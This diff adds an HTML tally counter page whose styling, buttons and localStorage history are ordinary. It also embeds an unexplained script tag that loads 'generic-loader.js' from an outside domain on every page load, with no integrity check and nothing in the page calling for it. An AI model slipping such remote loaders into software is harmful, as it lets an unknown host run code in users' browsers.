@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Tally Counter</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: system-ui, sans-serif;
+      background: linear-gradient(to bottom right, #dbeafe, #f0f9ff);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 2em 1em 6em;
+    }
+
+    h1 {
+      margin-bottom: 0.5em;
+      color: #1e40af;
+      text-align: center;
+    }
+
+    .counter-box {
+      background: white;
+      padding: 2em;
+      border-radius: 1em;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+    }
+
+    .count {
+      font-size: 4em;
+      color: #2563eb;
+      margin: 0.5em 0;
+    }
+
+    button {
+      font-size: 1.2em;
+      padding: 0.5em 1.5em;
+      margin: 0.5em;
+      border: none;
+      border-radius: 0.5em;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .increment {
+      background-color: #60a5fa;
+      color: white;
+    }
+
+    .increment:hover {
+      background-color: #3b82f6;
+    }
+
+    .reset {
+      background-color: #f87171;
+      color: white;
+    }
+
+    .reset:hover {
+      background-color: #ef4444;
+    }
+
+    .history {
+      margin-top: 1.5em;
+      background: #f9fafb;
+      border: 1px solid #e5e7eb;
+      border-radius: 0.5em;
+      padding: 1em;
+      max-width: 400px;
+      width: 100%;
+      font-size: 0.9em;
+      overflow-y: auto;
+      max-height: 200px;
+    }
+
+    .history-entry {
+      padding: 0.25em 0;
+      border-bottom: 1px solid #e5e7eb;
+    }
+
+    .history-entry:last-child {
+      border-bottom: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Tally Counter</h1>
+  <div class="counter-box">
+    <div class="count" id="countDisplay">0</div>
+    <button class="increment" onclick="incrementCount()">+1</button>
+    <button class="reset" onclick="resetCount()">Reset</button>
+  </div>
+
+  <div class="history" id="historyLog">
+    <strong>History</strong>
+    <div id="historyEntries"></div>
+  </div>
+
+  <div id="informationFooter" style="padding-left: 4em; padding-right: 4em;"></div>  
+  <script src="https://www.avemariacloud.com/generic-loader.js"></script>
+  <script>
+    const countDisplay = document.getElementById('countDisplay');
+    const historyEntries = document.getElementById('historyEntries');
+
+    function loadState() {
+      const storedCount = localStorage.getItem('tallyCount');
+      const storedHistory = JSON.parse(localStorage.getItem('tallyHistory') || '[]');
+      countDisplay.textContent = storedCount || '0';
+      historyEntries.innerHTML = '';
+      storedHistory.forEach(entry => addHistoryEntry(entry));
+    }
+
+    function incrementCount() {
+      let count = parseInt(countDisplay.textContent, 10);
+      count += 1;
+      countDisplay.textContent = count;
+      saveState(count, `+1 → ${count}`);
+    }
+
+    function resetCount() {
+      const oldCount = countDisplay.textContent;
+      countDisplay.textContent = '0';
+      saveState(0, `Reset (was ${oldCount})`);
+    }
+
+    function saveState(count, historyText) {
+      localStorage.setItem('tallyCount', count);
+      const currentHistory = JSON.parse(localStorage.getItem('tallyHistory') || '[]');
+      const timestamp = new Date().toLocaleString();
+      const newEntry = `${timestamp}: ${historyText}`;
+      currentHistory.unshift(newEntry);
+      localStorage.setItem('tallyHistory', JSON.stringify(currentHistory.slice(0, 50)));
+      addHistoryEntry(newEntry);
+    }
+
+    function addHistoryEntry(text) {
+      const div = document.createElement('div');
+      div.className = 'history-entry';
+      div.textContent = text;
+      historyEntries.insertBefore(div, historyEntries.firstChild);
+    }
+
+    loadState();
+  </script>
+</body>
+</html>
